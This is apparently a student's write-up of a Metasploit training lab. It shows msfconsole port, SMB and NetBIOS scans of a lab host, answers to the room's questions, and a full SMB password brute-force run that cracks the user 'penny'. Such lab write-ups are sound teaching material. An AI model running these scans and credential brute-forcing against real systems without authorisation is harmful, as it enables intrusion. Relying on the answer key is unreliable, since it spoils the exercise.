# Metasploit: Exploitation
Using Metasploit for scanning, vulnerability assessment and exploitation.

## Task 1 Introduction
In this room, we will explore how to effectively use Metasploit for vulnerability scanning and exploitation. You’ll learn how to leverage Metasploit’s powerful features to identify and exploit vulnerabilities, and how its integrated database can help streamline and manage penetration testing engagements with a wider scope. Additionally, we’ll cover how to generate payloads using msfvenom and establish a Meterpreter session across various target platforms.

### Key Topics Covered:
- Scanning target systems using Metasploit
- Utilizing the Metasploit database for efficient engagement management
- Performing vulnerability scans with Metasploit
- Exploiting vulnerable services on target systems
- Generating payloads with msfvenom and initiating Meterpreter sessions

Note: For all tasks involving brute-force attacks or other scenarios requiring a wordlist, we will use the predefined wordlist available on the AttackBox at the following path:
/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt

If you are using your own machine, please download the wordlist using the Download Task Files button located to the right of this page.

To follow along, launch the AttackBox and start Metasploit by running the msfconsole command.

## Task 2 Scanning
### Port Scanning

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the search portscan command.

```bash
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
```

Port scanning modules will require to set a few options:

```bash
msf6 > use 5
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

```

**Key Configuration Options:**
- CONCURRENCY: Sets how many targets will be scanned at the same time. Increasing this value can help speed up the scanning process when dealing with multiple systems.
- PORTS: Defines the range of port numbers to be scanned. Note that specifying 1-1000 in Metasploit scans ports 1 through 1000 in order, whereas Nmap (by default) scans the 1000 most commonly used ports, which may not be in order.
- RHOSTS: Indicates the target IP address or network you want to scan.
- THREADS: Determines how many threads will run in parallel during the scan. Using more threads can make the scan faster, but may use more system resources.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:

```bash
msf6 auxiliary(scanner/portscan/tcp) > nmap -sS 10.10.249.226
[*] exec: nmap -sS 10.10.249.226

Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-24 18:15 BST
Nmap scan report for 10.10.249.226
Host is up (0.00020s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
MAC Address: 02:DD:79:67:FD:2F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
msf6 auxiliary(scanner/portscan/tcp) > 
```

While Metasploit may not be the fastest option for port scanning, it still offers several useful modules that make it a valuable tool during the information-gathering phase.

### UDP service Identification
The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

```bash
msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/discovery/udp_sweep) > run
[*] Sending 13 probes to 10.10.249.226->10.10.249.226 (1 hosts)
[*] Discovered NetBIOS on 10.10.249.226:137 (ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1e>:G :IP-10-10-249-22:<00>:U :IP-10-10-249-22:<03>:U :IP-10-10-249-22:<20>:U :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) > 
```

### SMB Scans
Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be smb_enumshares and smb_version but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```bash
msf6 auxiliary(scanner/smb/smb_version) > set  RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 10.10.249.226:445     - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{00000000-0000-0000-0000-000000000000}) (authentication domain:IP-10-10-249-226)
[+] 10.10.249.226:445     -   Host is running Version 6.1.0 (unknown OS)
[*] 10.10.249.226         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 

```
When conducting service scans, it's important not to overlook less common services like NetBIOS. NetBIOS (Network Basic Input/Output System) is similar to SMB and allows systems on a network to share files or send data to printers. The NetBIOS name of a target machine can often hint at its function or significance within the network (e.g., names like CORP-DC, DEVOPS, or SALES). You might also discover shared folders or files, some of which could be accessible without a password or protected by weak credentials like admin, administrator, root, or toor.

Metasploit includes a wide range of modules designed to help you better understand your target system and potentially uncover vulnerabilities. It's always a good idea to run a quick search in Metasploit to check for any relevant modules based on what you’ve learned about the target.

### Question 1:
How many ports are open on the target system?

**Answer:** 5

### Question 2:
Using the relevant scanner, what NetBIOS name can you see?

**Answer:** ACME IT SUPPORT

```bash
msf6 > search NetBIOS

Matching Modules
================

   #  Name                                          Disclosure Date  Rank    Check  Description
   -  ----                                          ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/ntlm_info_enumeration  .                normal  No     Host Information Enumeration via NTLM Authentication
   1  auxiliary/spoof/llmnr/llmnr_response          .                normal  No     LLMNR Spoofer
   2  auxiliary/scanner/netbios/nbname              .                normal  No     NetBIOS Information Discovery
   3  auxiliary/spoof/nbns/nbns_response            .                normal  No     NetBIOS Name Service Spoofer
   4  auxiliary/server/netbios_spoof_nat            2016-06-14       normal  No     NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)
   5  auxiliary/admin/netbios/netbios_spoof         .                normal  No     NetBIOS Response Brute Force Spoof (Direct)
   6  auxiliary/dos/smb/smb_loris                   2017-06-29       normal  No     SMBLoris NBSS Denial of Service
   7  auxiliary/server/wpad                         .                normal  No     WPAD.dat File Server


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/server/wpad
```
Using auxiliary/scanner/netbios/nbname to find out name as the scanner describe it self infomation discovery
```bash
msf6 > use 2
msf6 auxiliary(scanner/netbios/nbname) > show options

Module options (auxiliary/scanner/netbios/nbname):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      137              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/netbios/nbname) > set RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/netbios/nbname) > run
[*] Sending NetBIOS requests to 10.10.249.226->10.10.249.226 (1 hosts)
[+] 10.10.249.226 [IP-10-10-249-22] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-249-22) Addresses:(10.10.249.226) Mac:00:00:00:00:00:00 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### Question 3:
What is running on port 8000?

**Answer:** webfs/1.21

```bash
msf6 > search http_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version
```

Use this to find out http version

```bash
msf6 > use 0
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/http/http_version) > run
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
I run after setting RHOSTS but I needed to set RPORT to 8000 and it was set to 80 by default
```bash
msf6 auxiliary(scanner/http/http_version) > show options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.249.226    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host


View the full module info with the info, or info -d command.
```

### Question 4:
What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.

**Answer:** leo1234

First search smb_login

```bash
msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login  .                normal  No     SMB Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login
```

```bash
msf6 > use 0
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf6 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   ANONYMOUS_LOGIN    false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   CreateSession      false            no        Create a new session for every successful login
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             10.10.249.226    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```
Now we'll set required options

we have to set our RHOST too in my case I have already did in start

```bash
msf6 auxiliary(scanner/smb/smb_login) > set SMBuser penny
SMBuser => penny
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(scanner/smb/smb_login) > 
```

Now run

```bash
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 10.10.249.226:445     - 10.10.249.226:445 - Starting SMB login bruteforce
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:95',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:98',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:2003',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:2008',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:111111',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:123456',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:12345678',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:1qaz2wsx',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:abc',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:abc123',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:abcd123',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:account',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:admin',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:adminadmin',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:administator',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:admins',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:air',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:alpine',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2013',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2013',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2014',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2014',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2015',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2015',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2016',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2016',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2017',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2017',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:bankbank',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:baseball',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:basketball',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:bird',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:burp',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:change',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:changelater',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:changeme',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company!',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company1',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company1!',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company123',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex1',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex2',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex3',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complexpassword',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:database',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:default',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:dev',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:devdev',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:devdevdev',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:dirt',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:dragon',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:earth',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:fire',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:football',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:goat',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:goat',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:god',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:guessme',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:hugs',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:letmein',
[+] 10.10.249.226:445     - 10.10.249.226:445 - Success: '.\penny:leo1234'
[*] 10.10.249.226:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.249.226:445     - Bruteforce completed, 1 credential was successful.
[*] 10.10.249.226:445     - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) > 
```
